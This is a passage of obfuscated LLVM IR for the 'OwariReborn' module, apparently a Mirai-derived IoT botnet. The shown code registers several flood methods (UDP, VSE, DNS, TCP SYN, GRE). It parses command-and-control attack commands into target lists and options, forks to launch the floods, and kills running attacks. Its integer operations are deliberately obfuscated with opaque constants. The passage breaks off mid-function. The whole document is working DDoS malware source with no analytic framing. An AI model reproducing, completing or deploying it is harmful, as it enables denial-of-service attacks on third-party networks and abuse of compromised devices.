; ModuleID = 'host/ir_sub/OwariReborn.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] [i32 5, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0, i32 0], align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 322420947, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #6
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = sub i8 %27, -21
  %29 = add i8 %28, 1
  %30 = add i8 %29, -21
  %31 = add i8 %27, 1
  store i8 %30, i8* @methods_len, align 1
  %32 = zext i8 %27 to i64
  %33 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %32
  store %struct.attack_method* %25, %struct.attack_method** %33, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 8
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8 x i32], [8 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add i32 %22, 1041528904
  %24 = add i32 %23, 1
  %25 = sub i32 %24, 1041528904
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %249

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = add i64 %25, 8904145218132823930
  %27 = sub i64 %26, 4
  %28 = sub i64 %27, 8904145218132823930
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %249

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 0, 1
  %41 = add i64 %39, %40
  %42 = sub i64 %39, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %34
  br label %249

; <label>:47:                                     ; preds = %34
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, -5199446055000249392
  %54 = sub i64 %53, 1
  %55 = add i64 %54, -5199446055000249392
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %249

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %249

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %125, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %131

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 %100, -7738056722040690602
  %102 = sub i64 %101, 5
  %103 = add i64 %102, -7738056722040690602
  %104 = sub i64 %100, 5
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %4, align 4
  %106 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i32 0, i32 0
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %110, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 0
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  store i32 %117, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %80
  %126 = load i32, i32* %5, align 4
  %127 = add i32 %126, 1730380363
  %128 = add i32 %127, 1
  %129 = sub i32 %128, 1730380363
  %130 = add nsw i32 %126, 1
  store i32 %129, i32* %5, align 4
  br label %75

; <label>:131:                                    ; preds = %75
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %134 = icmp ult i64 %133, 1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %131
  br label %249

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %3, align 8
  %139 = load i8, i8* %137, align 1
  store i8 %139, i8* %9, align 1
  %140 = load i32, i32* %4, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 %141, 1590611581491734600
  %143 = sub i64 %142, 1
  %144 = sub i64 %143, 1590611581491734600
  %145 = sub i64 %141, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %241

; <label>:150:                                    ; preds = %136
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %235, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %240

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %249

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 %175, -1248685661089915720
  %177 = sub i64 %176, 1
  %178 = add i64 %177, -1248685661089915720
  %179 = sub i64 %175, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %165
  br label %249

; <label>:185:                                    ; preds = %165
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %190, -1460232337121459488
  %192 = sub i64 %191, 1
  %193 = sub i64 %192, -1460232337121459488
  %194 = sub i64 %190, 1
  %195 = trunc i64 %193 to i32
  store i32 %195, i32* %4, align 4
  %196 = load i32, i32* %4, align 4
  %197 = load i8, i8* %12, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp slt i32 %196, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %185
  br label %249

; <label>:201:                                    ; preds = %185
  %202 = load i8, i8* %12, align 1
  %203 = zext i8 %202 to i32
  %204 = sub i32 0, 1
  %205 = sub i32 %203, %204
  %206 = add nsw i32 %203, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = sub i32 %230, 2063423
  %232 = sub i32 %231, %229
  %233 = add i32 %232, 2063423
  %234 = sub nsw i32 %230, %229
  store i32 %233, i32* %4, align 4
  br label %235

; <label>:235:                                    ; preds = %201
  %236 = load i32, i32* %5, align 4
  %237 = sub i32 0, 1
  %238 = sub i32 %236, %237
  %239 = add nsw i32 %236, 1
  store i32 %238, i32* %5, align 4
  br label %155

; <label>:240:                                    ; preds = %155
  br label %241

; <label>:241:                                    ; preds = %240, %136
  %242 = call i32* @__errno_location() #7
  store i32 0, i32* %242, align 4
  %243 = load i32, i32* %6, align 4
  %244 = load i8, i8* %7, align 1
  %245 = load i8, i8* %8, align 1
  %246 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %247 = load i8, i8* %9, align 1
  %248 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %243, i8 zeroext %244, i8 zeroext %245, %struct.attack_target* %246, i8 zeroext %247, %struct.attack_option* %248)
  br label %249

; <label>:249:                                    ; preds = %241, %200, %184, %164, %135, %69, %61, %46, %33, %16
  %250 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %251 = icmp ne %struct.attack_target* %250, null
  br i1 %251, label %252, label %255

; <label>:252:                                    ; preds = %249
  %253 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %254 = bitcast %struct.attack_target* %253 to i8*
  call void @free(i8* %254) #6
  br label %255

; <label>:255:                                    ; preds = %252, %249
  %256 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %257 = icmp ne %struct.attack_option* %256, null
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %255
  %259 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %260 = load i8, i8* %9, align 1
  %261 = zext i8 %260 to i32
  call void @free_opts(%struct.attack_option* %259, i32 %261)
  br label %262

; <label>:262:                                    ; preds = %258, %255
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %61

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %61

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = sub i32 0, %55
  %57 = sub i32 0, 1
  %58 = add i32 %56, %57
  %59 = sub i32 0, %58
  %60 = add nsw i32 %55, 1
  store i32 %59, i32* %14, align 4
  br label %23

; <label>:61:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %43

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 %36, 308778215
  %38 = add i32 %37, 1
  %39 = add i32 %38, 308778215
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %10, align 4
  br label %11

; <label>:41:                                     ; preds = %11
  %42 = load i8*, i8** %9, align 8
  store i8* %42, i8** %5, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %27
  %44 = load i8*, i8** %5, align 8
  ret i8* %44
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
